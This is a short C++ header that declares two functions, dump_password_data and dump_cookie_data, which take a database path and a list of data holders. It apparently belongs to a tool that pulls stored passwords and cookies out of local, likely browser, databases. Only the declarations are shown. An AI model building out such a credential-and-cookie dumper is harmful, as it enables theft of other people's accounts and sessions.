#pragma once

#ifndef DATADUMP_H
#define DATADUMP_H

#include "includes\Imports.h"
#include "includes\DataHolder.h"

bool dump_password_data(const std::string& db_path, std::vector<DataHolder> data_array, int data_index);
bool dump_cookie_data(const std::string& db_path, std::vector<DataHolder> data_array, int data_index);

#endif // DATADUMP_H